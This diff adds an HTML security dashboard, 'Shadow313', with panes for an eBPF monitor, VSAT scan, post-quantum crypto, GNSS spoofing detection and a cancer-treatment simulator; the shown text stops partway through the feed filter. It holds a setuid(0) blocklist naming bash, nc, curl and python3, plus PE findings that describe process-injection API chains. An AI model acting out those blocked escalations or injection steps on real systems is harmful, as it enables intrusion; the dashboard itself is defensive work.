@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow313 | Unified Platform Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Space+Grotesk:wght@400;700&display=swap');
+        body { font-family:'Space Grotesk',sans-serif; background:#020617; }
+        .code { font-family:'Fira Code',monospace; }
+        ::-webkit-scrollbar{width:5px;height:5px}
+        ::-webkit-scrollbar-track{background:#0b0f19}
+        ::-webkit-scrollbar-thumb{background:#1e293b;border-radius:4px}
+        .tab-btn.active{background:linear-gradient(to right,#0891b2,#4f46e5);color:#fff;box-shadow:0 4px 15px rgba(8,145,178,0.2)}
+        .log-entry{animation:fadeIn 0.3s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(-3px)}to{opacity:1;transform:translateY(0)}}
+        .pulse-dot{animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
+        .sev-critical{color:#f87171;border-color:rgba(248,113,113,0.3);background:rgba(248,113,113,0.05)}
+        .sev-high{color:#fb923c;border-color:rgba(251,146,60,0.3);background:rgba(251,146,60,0.05)}
+        .sev-medium{color:#fbbf24;border-color:rgba(251,191,36,0.3);background:rgba(251,191,36,0.05)}
+        .sev-low{color:#34d399;border-color:rgba(52,211,153,0.3);background:rgba(52,211,153,0.05)}
+        .sev-info{color:#94a3b8;border-color:rgba(148,163,184,0.2);background:rgba(148,163,184,0.03)}
+    </style>
+</head>
+<body class="text-slate-100 min-h-screen flex flex-col">
+
+<!-- ── HEADER ──────────────────────────────────────────────────────────────── -->
+<header class="border-b border-slate-800 bg-slate-950/90 backdrop-blur sticky top-0 z-50 px-5 py-3 flex flex-wrap justify-between items-center gap-3">
+    <div class="flex items-center gap-3">
+        <div class="p-2 bg-gradient-to-tr from-cyan-600 to-indigo-600 rounded-xl shadow-lg shadow-cyan-500/20">
+            <i class="fa-solid fa-shield-halved text-white text-lg"></i>
+        </div>
+        <div>
+            <h1 class="text-base font-bold tracking-tight bg-gradient-to-r from-white via-slate-200 to-cyan-400 bg-clip-text text-transparent">
+                SHADOW313 UNIFIED PLATFORM
+            </h1>
+            <p class="text-[10px] text-slate-500 code uppercase tracking-wider">
+                Aegis Nexus · Shadow313 CLI · eBPF Monitor · VSAT · QKD · OncoSim
+            </p>
+        </div>
+    </div>
+    <div class="flex items-center gap-3 flex-wrap">
+        <span id="utc-clock" class="text-xs code text-slate-400 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-full"></span>
+        <span id="bus-status" class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold bg-slate-900 border border-slate-800 text-slate-400">
+            <span class="w-2 h-2 rounded-full bg-slate-600 pulse-dot"></span> Bus: Connecting...
+        </span>
+        <span id="total-events-badge" class="text-xs code bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 px-3 py-1.5 rounded-full">0 Events</span>
+    </div>
+</header>
+
+<!-- ── LAYOUT ───────────────────────────────────────────────────────────────── -->
+<div class="flex flex-1 flex-col lg:flex-row">
+
+<!-- Sidebar -->
+<aside class="w-full lg:w-60 border-r border-slate-800 bg-slate-950/40 p-4 space-y-1 flex flex-col shrink-0">
+    <div class="text-[10px] uppercase text-slate-500 font-semibold px-2 mb-2 tracking-wider code">Platform Modules</div>
+
+    <button onclick="switchTab('overview')"   id="btn-overview"   class="tab-btn active w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium transition-all">
+        <i class="fa-solid fa-gauge-high w-4"></i> Overview
+    </button>
+    <button onclick="switchTab('shadow313')"  id="btn-shadow313"  class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-terminal w-4 text-cyan-400"></i> Shadow313 CLI
+    </button>
+    <button onclick="switchTab('ebpf')"       id="btn-ebpf"       class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-microchip w-4 text-green-400"></i> eBPF Kernel
+        <span id="ebpf-badge" class="hidden ml-auto bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded-full border border-red-500/20 font-bold">!</span>
+    </button>
+    <button onclick="switchTab('vsat')"       id="btn-vsat"       class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-satellite-dish w-4 text-amber-400"></i> VSAT Ground
+        <span id="vsat-badge" class="hidden ml-auto bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded-full border border-red-500/20 font-bold">!</span>
+    </button>
+    <button onclick="switchTab('qkd')"        id="btn-qkd"        class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-key w-4 text-indigo-400"></i> QKD / PQC
+        <span id="qkd-badge" class="hidden ml-auto bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded-full border border-red-500/20 font-bold">!</span>
+    </button>
+    <button onclick="switchTab('rf')"         id="btn-rf"         class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-wave-square w-4 text-rose-400"></i> RF / GNSS
+    </button>
+    <button onclick="switchTab('oncosim')"    id="btn-oncosim"    class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-dna w-4 text-emerald-400"></i> OncoSim Bio
+    </button>
+    <button onclick="switchTab('live-feed')"  id="btn-live-feed"  class="tab-btn w-full flex items-center gap-2 px-3 py-2.5 rounded-xl text-sm text-left font-medium text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+        <i class="fa-solid fa-rss w-4 text-cyan-400"></i> Live Event Feed
+    </button>
+
+    <!-- Platform links -->
+    <div class="pt-4 mt-auto border-t border-slate-800 space-y-2">
+        <div class="text-[10px] uppercase text-slate-500 font-semibold px-2 tracking-wider code">Launch Apps</div>
+        <a href="aegis_nexus.html" target="_blank" class="flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+            <i class="fa-solid fa-satellite-dish text-cyan-400 w-4"></i> Aegis Nexus
+        </a>
+        <a href="sovereign_shield.html" target="_blank" class="flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-slate-400 hover:text-white hover:bg-slate-900 transition-all">
+            <i class="fa-solid fa-atom text-indigo-400 w-4"></i> Sovereign-Shield QKD
+        </a>
+    </div>
+</aside>
+
+<!-- Main -->
+<main class="flex-1 p-5 overflow-x-hidden">
+
+<!-- ══ OVERVIEW ══════════════════════════════════════════════════════════════ -->
+<div id="pane-overview" class="tab-pane space-y-5">
+
+    <!-- Stat cards -->
+    <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
+        <div class="bg-slate-900/60 border border-red-900/40 rounded-2xl p-4 relative overflow-hidden">
+            <div class="absolute top-0 left-0 right-0 h-0.5 bg-red-500"></div>
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">Critical</div>
+            <div class="text-3xl font-black text-red-400" id="stat-critical">0</div>
+        </div>
+        <div class="bg-slate-900/60 border border-orange-900/40 rounded-2xl p-4 relative overflow-hidden">
+            <div class="absolute top-0 left-0 right-0 h-0.5 bg-orange-500"></div>
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">High</div>
+            <div class="text-3xl font-black text-orange-400" id="stat-high">0</div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">Medium</div>
+            <div class="text-3xl font-black text-amber-400" id="stat-medium">0</div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">Shadow313</div>
+            <div class="text-3xl font-black text-cyan-400" id="stat-shadow313">0</div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">eBPF</div>
+            <div class="text-3xl font-black text-green-400" id="stat-ebpf">0</div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <div class="text-[10px] text-slate-400 code uppercase mb-1">VSAT</div>
+            <div class="text-3xl font-black text-amber-400" id="stat-vsat">0</div>
+        </div>
+    </div>
+
+    <!-- Charts row -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-5">
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Events by Severity</h3>
+            <div style="height:200px"><canvas id="severity-chart"></canvas></div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Events by Source</h3>
+            <div style="height:200px"><canvas id="source-chart"></canvas></div>
+        </div>
+    </div>
+
+    <!-- Platform status grid -->
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-4 code uppercase tracking-wider">Platform Module Status</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-3" id="module-status-grid">
+            <!-- populated by JS -->
+        </div>
+    </div>
+
+    <!-- Recent critical events -->
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Recent Critical Events</h3>
+        <div class="space-y-2" id="critical-events-list">
+            <div class="text-xs text-slate-500">Loading events...</div>
+        </div>
+    </div>
+</div>
+
+<!-- ══ SHADOW313 ══════════════════════════════════════════════════════════════ -->
+<div id="pane-shadow313" class="tab-pane hidden space-y-4">
+    <div class="flex items-center justify-between">
+        <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">Shadow313 CLI — Detection Engine</h2>
+        <button onclick="runAttackDemo()" class="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-2">
+            <i class="fa-solid fa-play"></i> Run APT Demo
+        </button>
+    </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Tools</div>
+            <div class="text-2xl font-black text-cyan-400">16</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Tests</div>
+            <div class="text-2xl font-black text-green-400">69/69</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Detection Rate</div>
+            <div class="text-2xl font-black text-white">84.7%</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">SOAR Response</div>
+            <div class="text-2xl font-black text-emerald-400">262ms</div>
+        </div>
+    </div>
+    <div class="bg-black border border-slate-800 rounded-2xl p-4 code text-xs h-80 overflow-y-auto" id="shadow313-log">
+        <div class="text-slate-500">// Shadow313 detection log — click "Run APT Demo" to simulate</div>
+    </div>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
+            <div class="text-[10px] text-slate-400 code uppercase mb-2">ATT&CK Coverage</div>
+            <div class="text-lg font-black text-amber-400">22.4%</div>
+            <div class="w-full bg-slate-800 rounded-full h-1 mt-2"><div class="bg-amber-500 h-1 rounded-full" style="width:22.4%"></div></div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
+            <div class="text-[10px] text-slate-400 code uppercase mb-2">TI Feeds Active</div>
+            <div class="text-lg font-black text-cyan-400">4 Feeds</div>
+            <div class="text-[10px] text-slate-500 mt-1">MISP · OTX · VT · Abuse.ch</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3">
+            <div class="text-[10px] text-slate-400 code uppercase mb-2">IOC Store</div>
+            <div class="text-lg font-black text-green-400">35 IOCs</div>
+            <div class="text-[10px] text-slate-500 mt-1">19 high-confidence</div>
+        </div>
+    </div>
+</div>
+
+<!-- ══ EBPF ═══════════════════════════════════════════════════════════════════ -->
+<div id="pane-ebpf" class="tab-pane hidden space-y-4">
+    <div class="flex items-center justify-between">
+        <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">eBPF Kernel Monitor</h2>
+        <button onclick="startEBPFStream()" id="ebpf-btn" class="px-4 py-2 bg-green-600 hover:bg-green-500 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-white pulse-dot"></span> Start Monitor
+        </button>
+    </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Blocked</div>
+            <div class="text-2xl font-black text-red-400" id="ebpf-blocked">0</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Allowed</div>
+            <div class="text-2xl font-black text-green-400" id="ebpf-allowed">0</div>
+        </div>
+        <div class="bg-slate-900 border border-amber-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">setuid(0)</div>
+            <div class="text-2xl font-black text-amber-400" id="ebpf-setuid">0</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Events/min</div>
+            <div class="text-2xl font-black text-white" id="ebpf-eps">0</div>
+        </div>
+    </div>
+    <div class="bg-black border border-slate-800 rounded-2xl p-4 code text-xs h-72 overflow-y-auto" id="ebpf-log">
+        <div class="text-slate-500">// eBPF kernel monitor — click Start Monitor</div>
+    </div>
+    <!-- setuid policy -->
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">setuid(0) Policy</h3>
+        <div class="grid grid-cols-2 gap-3">
+            <div>
+                <div class="text-[10px] text-green-400 code uppercase mb-2">✅ Whitelist (allowed)</div>
+                <div class="space-y-1">
+                    <div class="text-xs text-slate-400 bg-slate-950 px-2 py-1 rounded code">sshd · sudo · su · login · cron</div>
+                </div>
+            </div>
+            <div>
+                <div class="text-[10px] text-red-400 code uppercase mb-2">🔴 Blocklist (intercepted)</div>
+                <div class="space-y-1">
+                    <div class="text-xs text-slate-400 bg-slate-950 px-2 py-1 rounded code">bash · sh · nc · curl · python3</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ══ VSAT ════════════════════════════════════════════════════════════════════ -->
+<div id="pane-vsat" class="tab-pane hidden space-y-4">
+    <div class="flex items-center justify-between">
+        <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">VSAT Ground Segment</h2>
+        <button onclick="runVSATSweep()" class="px-4 py-2 bg-amber-600 hover:bg-amber-500 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-2">
+            <i class="fa-solid fa-play"></i> Run Sweep
+        </button>
+    </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">SNR</div>
+            <div class="text-2xl font-black text-red-400">5.9 dB</div>
+            <div class="text-[10px] text-red-400">⚠ Critical</div>
+        </div>
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Clock Skew</div>
+            <div class="text-2xl font-black text-red-400">+55.1 Hz</div>
+            <div class="text-[10px] text-red-400">⚠ Critical</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Open Ports</div>
+            <div class="text-2xl font-black text-red-400">4</div>
+            <div class="text-[10px] text-slate-400">21·23·80·7547</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">CVEs</div>
+            <div class="text-2xl font-black text-red-400">1</div>
+            <div class="text-[10px] text-slate-400">CVE-2026-3392</div>
+        </div>
+    </div>
+    <div class="bg-black border border-slate-800 rounded-2xl p-4 code text-xs h-64 overflow-y-auto" id="vsat-log">
+        <div class="text-slate-500">// VSAT sweep log — click Run Sweep</div>
+    </div>
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Remediation Status</h3>
+        <div class="space-y-2" id="vsat-remediation">
+            <!-- populated by JS -->
+        </div>
+    </div>
+</div>
+
+<!-- ══ QKD / PQC ══════════════════════════════════════════════════════════════ -->
+<div id="pane-qkd" class="tab-pane hidden space-y-4">
+    <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">QKD / Post-Quantum Cryptography</h2>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Last QBER</div>
+            <div class="text-2xl font-black text-red-400">40.0%</div>
+            <div class="text-[10px] text-red-400">Key Dropped</div>
+        </div>
+        <div class="bg-slate-900 border border-amber-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">PQC Score</div>
+            <div class="text-2xl font-black text-amber-400">42.8%</div>
+            <div class="text-[10px] text-slate-400">Migration needed</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">HNDL Findings</div>
+            <div class="text-2xl font-black text-red-400">4</div>
+            <div class="text-[10px] text-slate-400">RSA-2048 · ECDH</div>
+        </div>
+        <div class="bg-slate-900 border border-green-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Keys Generated</div>
+            <div class="text-2xl font-black text-green-400">2</div>
+            <div class="text-[10px] text-slate-400">ML-KEM + ML-DSA</div>
+        </div>
+    </div>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+        <div class="bg-slate-900 border border-cyan-500/20 rounded-xl p-4">
+            <div class="text-[10px] text-cyan-400 code font-bold uppercase mb-2">FIPS 203 — ML-KEM-1024</div>
+            <div class="text-xs text-slate-300">Key encapsulation · Level 5</div>
+            <div class="text-[10px] text-slate-500 mt-1">1,568B pubkey · 3,168B privkey</div>
+            <div class="mt-2 text-[10px] bg-cyan-500/10 text-cyan-400 px-2 py-1 rounded border border-cyan-500/20">✅ Generated</div>
+        </div>
+        <div class="bg-slate-900 border border-indigo-500/20 rounded-xl p-4">
+            <div class="text-[10px] text-indigo-400 code font-bold uppercase mb-2">FIPS 204 — ML-DSA-5</div>
+            <div class="text-xs text-slate-300">Digital signatures · Level 5</div>
+            <div class="text-[10px] text-slate-500 mt-1">2,592B pubkey · 4,864B privkey</div>
+            <div class="mt-2 text-[10px] bg-indigo-500/10 text-indigo-400 px-2 py-1 rounded border border-indigo-500/20">✅ Generated</div>
+        </div>
+        <div class="bg-slate-900 border border-amber-500/20 rounded-xl p-4">
+            <div class="text-[10px] text-amber-400 code font-bold uppercase mb-2">FIPS 205 — SLH-DSA</div>
+            <div class="text-xs text-slate-300">Hash-based signatures · Level 5</div>
+            <div class="text-[10px] text-slate-500 mt-1">64B pubkey · ~29KB sig</div>
+            <div class="mt-2 text-[10px] bg-amber-500/10 text-amber-400 px-2 py-1 rounded border border-amber-500/20">⬜ Pending</div>
+        </div>
+    </div>
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Shor's Threat Estimator</h3>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+            <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-3">
+                <div class="text-xs font-bold text-red-400">RSA-2048</div>
+                <div class="text-[10px] text-slate-400 mt-1">4,096 logical qubits needed</div>
+                <div class="text-[10px] text-red-400 mt-1">⚠ HNDL Risk — Migrate NOW</div>
+            </div>
+            <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-3">
+                <div class="text-xs font-bold text-red-400">ECDH P-256</div>
+                <div class="text-[10px] text-slate-400 mt-1">2,048 logical qubits needed</div>
+                <div class="text-[10px] text-red-400 mt-1">⚠ HNDL Risk — Migrate NOW</div>
+            </div>
+            <div class="bg-green-500/5 border border-green-500/20 rounded-xl p-3">
+                <div class="text-xs font-bold text-green-400">AES-256</div>
+                <div class="text-[10px] text-slate-400 mt-1">Grover's → 128-bit effective</div>
+                <div class="text-[10px] text-green-400 mt-1">✅ Quantum-safe</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ══ RF / GNSS ═══════════════════════════════════════════════════════════════ -->
+<div id="pane-rf" class="tab-pane hidden space-y-4">
+    <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">RF Spectrum & GNSS Monitor</h2>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Carrier SNR</div>
+            <div class="text-2xl font-black text-red-400">5.9 dB</div>
+        </div>
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Clock Skew</div>
+            <div class="text-2xl font-black text-red-400">+55.1 Hz</div>
+        </div>
+        <div class="bg-slate-900 border border-red-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">GPS Spoof</div>
+            <div class="text-lg font-black text-red-400">DETECTED</div>
+            <div class="text-[10px] text-red-400">9,842 km jump</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Root Cause</div>
+            <div class="text-sm font-black text-amber-400">OSCILLATOR_DRIFT</div>
+        </div>
+    </div>
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">NMEA Integrity Breach</h3>
+        <div class="code text-xs space-y-1">
+            <div class="text-green-400">[✓] Frame 1: Lat 48°07'N, Lon 11°31'E — Munich (VALID)</div>
+            <div class="text-red-400">[!!!] Frame 3: Lat 35°12'N, Lon 139°46'W — Pacific (SPOOFED)</div>
+            <div class="text-red-400">[!!!] Delta: 9,842 km in 1.0s — physically impossible</div>
+            <div class="text-amber-400">[!] AGC drop: 1.2V → 0.3V — spoofer overpowering signal</div>
+            <div class="text-amber-400">[!] Doppler skew: 500Hz — fake satellites detected</div>
+        </div>
+    </div>
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">PE Static Analysis Results</h3>
+        <div class="space-y-2">
+            <div class="flex items-center justify-between p-2 bg-red-500/5 border border-red-500/20 rounded-lg">
+                <div>
+                    <div class="text-xs font-bold text-red-400">crypt_untrusted_loader.exe</div>
+                    <div class="text-[10px] text-slate-400">UPX0/UPX1 packer · entropy 7.95 · LoadLibraryA+VirtualAlloc</div>
+                </div>
+                <span class="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded font-bold">MALICIOUS</span>
+            </div>
+            <div class="flex items-center justify-between p-2 bg-red-500/5 border border-red-500/20 rounded-lg">
+                <div>
+                    <div class="text-xs font-bold text-red-400">untrusted_dropper.bin</div>
+                    <div class="text-[10px] text-slate-400">.hidden section entropy 7.91 · VirtualAllocEx+WriteProcessMemory+CreateRemoteThread</div>
+                </div>
+                <span class="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded font-bold">INJECTOR</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ══ ONCOSIM ═════════════════════════════════════════════════════════════════ -->
+<div id="pane-oncosim" class="tab-pane hidden space-y-4">
+    <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">OncoSim — Biological Defense Simulator</h2>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Day</div>
+            <div class="text-2xl font-black text-white">297</div>
+        </div>
+        <div class="bg-slate-900 border border-amber-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Tumor Vol</div>
+            <div class="text-2xl font-black text-amber-400">1,343 mm³</div>
+        </div>
+        <div class="bg-slate-900 border border-green-900/40 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Toxicity</div>
+            <div class="text-2xl font-black text-green-400">0%</div>
+        </div>
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-3 text-center">
+            <div class="text-[10px] text-slate-400 code uppercase">Immune Cap</div>
+            <div class="text-2xl font-black text-cyan-400">41%</div>
+        </div>
+    </div>
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Helix-Watch Protocol Status</h3>
+            <div class="space-y-2">
+                <div class="flex items-center justify-between p-2 bg-green-500/5 border border-green-500/20 rounded-lg">
+                    <span class="text-xs text-slate-300">EGFR T790M → Gen-3 TKI</span>
+                    <span class="text-[10px] text-green-400 font-bold">PATCHED</span>
+                </div>
+                <div class="flex items-center justify-between p-2 bg-green-500/5 border border-green-500/20 rounded-lg">
+                    <span class="text-xs text-slate-300">C797S → Gen-4 Non-Covalent</span>
+                    <span class="text-[10px] text-green-400 font-bold">PATCHED</span>
+                </div>
+                <div class="flex items-center justify-between p-2 bg-green-500/5 border border-green-500/20 rounded-lg">
+                    <span class="text-xs text-slate-300">PD-L1 Immune Escape → PD-1 Inhibitor</span>
+                    <span class="text-[10px] text-green-400 font-bold">ACTIVE</span>
+                </div>
+                <div class="flex items-center justify-between p-2 bg-amber-500/5 border border-amber-500/20 rounded-lg">
+                    <span class="text-xs text-slate-300">CNS Metastasis Risk</span>
+                    <span class="text-[10px] text-amber-400 font-bold">MONITORING</span>
+                </div>
+            </div>
+        </div>
+        <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+            <h3 class="text-xs font-semibold text-slate-300 mb-3 code uppercase tracking-wider">Treatment Log</h3>
+            <div class="code text-[10px] space-y-1 text-slate-400">
+                <div class="text-green-400">[Day 271] Immunotherapy: Immune cap → 63%</div>
+                <div class="text-cyan-400">[Day 269] Radiotherapy: 2 Gy · SF 48.7%</div>
+                <div class="text-amber-400">[Day 268] Chemotherapy: -20% tumor mass</div>
+                <div class="text-slate-300">[Day 297] Status: Clinically Stable</div>
+                <div class="text-emerald-400">[Stress Test] C797S resistance → NEUTRALIZED</div>
+                <div class="text-emerald-400">[Stress Test] T-Cell exhaustion → RE-ACTIVATED</div>
+            </div>
+        </div>
+    </div>
+    <div class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
+        <h3 class="text-xs font-semibold text-slate-300 mb-2 code uppercase tracking-wider">Disclaimer</h3>
+        <p class="text-[10px] text-slate-500">Educational simulation only. Implements standard pharmacological models (Gompertz growth, Log-kill, Linear-Quadratic radiobiology). Does not provide clinical recommendations or medical advice.</p>
+    </div>
+</div>
+
+<!-- ══ LIVE FEED ═══════════════════════════════════════════════════════════════ -->
+<div id="pane-live-feed" class="tab-pane hidden space-y-4">
+    <div class="flex items-center justify-between">
+        <h2 class="text-sm font-bold text-slate-200 code uppercase tracking-wider">Live Unified Event Feed</h2>
+        <div class="flex gap-2">
+            <select id="feed-filter-source" onchange="filterFeed()" class="bg-slate-800 border border-slate-700 text-xs text-slate-300 rounded-lg px-3 py-2 code">
+                <option value="">All Sources</option>
+                <option value="shadow313">Shadow313</option>
+                <option value="ebpf_monitor">eBPF</option>
+                <option value="vsat_scanner">VSAT</option>
+                <option value="rf_monitor">RF Monitor</option>
+                <option value="gnss_monitor">GNSS</option>
+                <option value="sovereign_shield">QKD</option>
+                <option value="pqc_auditor">PQC</option>
+                <option value="oncosim">OncoSim</option>
+            </select>
+            <select id="feed-filter-sev" onchange="filterFeed()" class="bg-slate-800 border border-slate-700 text-xs text-slate-300 rounded-lg px-3 py-2 code">
+                <option value="">All Severities</option>
+                <option value="CRITICAL">Critical</option>
+                <option value="HIGH">High</option>
+                <option value="MEDIUM">Medium</option>
+                <option value="LOW">Low</option>
+            </select>
